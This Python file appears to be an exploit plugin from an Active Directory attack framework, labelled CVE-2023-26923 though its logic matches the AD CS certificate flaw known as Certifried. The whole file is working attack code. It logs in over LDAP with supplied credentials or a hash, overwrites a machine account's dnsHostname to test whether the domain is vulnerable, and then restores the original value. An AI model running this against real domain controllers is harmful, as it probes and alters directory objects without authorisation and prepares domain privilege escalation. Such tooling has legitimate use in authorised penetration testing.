import argparse
from copy import copy

import ldap3

from modules.certipylib.ldap import LDAPConnection
from modules.certipylib.target import Target
from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADCVE_2023_26923(PluginAdExploitBase):
    display = "CVE-2023-26923"
    alias = "cve_2023_26923"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display
        parser.add_argument("-u", "--username", help="username", dest="username")
        parser.add_argument("-p", "--password", help="password", dest="password")
        parser.add_argument("--hash", help="password hash", dest="hash")
        parser.add_argument("--dc-ip", help="dc ip", dest="dc_ip")
        parser.add_argument("--ldaps", help="using ldaps to connect", action=argparse.BooleanOptionalAction,
                            default=False, dest="ldaps")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        scan_result = copy(self.result)

        _target = Target.create(
            username=args.username,
            password=args.password,
            hashes=args.hash,
            dc_ip=args.dc_ip
        )
        _connection = None

        if args.ldaps:
            ldap_scheme = "ldaps"
        else:
            ldap_scheme = "ldap"

        target_ip = _target.dc_ip
        _target.dc_ip = target_ip
        _target.target_ip = target_ip
        _connection = LDAPConnection(_target, ldap_scheme)
        _connection.connect()
        machine_user = _connection.get_user(_target.username)
        output.debug(f'got user {machine_user}')
        dns_hostname = machine_user['attributes']['dnsHostname']
        new_dns_hostname = '.'.join(['fucking_crazy_thursday'] + dns_hostname.split('.')[1:])
        output.debug(f'setting a new dnsHostname : {new_dns_hostname}')
        result = _connection.modify(machine_user.get('distinguishedName'), {
            'dnsHostname': (ldap3.MODIFY_REPLACE, new_dns_hostname)
        })
        if result["result"] == 0:
            output.info(f'[{target_ip}] success, target is vulnerable!!!')

            scan_result["status"] = 1
            scan_result["data"]["instance_list"] = [
                {
                    "ip": target_ip,
                }
            ]
        elif result["result"] == 19:
            output.info(f'[{target_ip}] constraintViolation, target is not vulnerable :<')
            scan_result["status"] = 0
            scan_result["data"]["instance_list"] = [{}]
        else:
            output.error(f'unknown error happened {result["result"]}'
                         f'check here https://ldap.com/ldap-result-code-reference/')

            scan_result["status"] = -1
            scan_result["data"]["instance_list"] = [{
                "error_code": result["result"]
            }]
        output.debug(f'restoring old dnsHostname')
        result = _connection.modify(machine_user.get('distinguishedName'), {
            'dnsHostname': (ldap3.MODIFY_REPLACE, dns_hostname)
        })
        if result["result"] == 0:
            output.success(f'old dnsHostname restored.')
        else:
            output.error(f'unknown error happened {result["result"]}')

        return scan_result
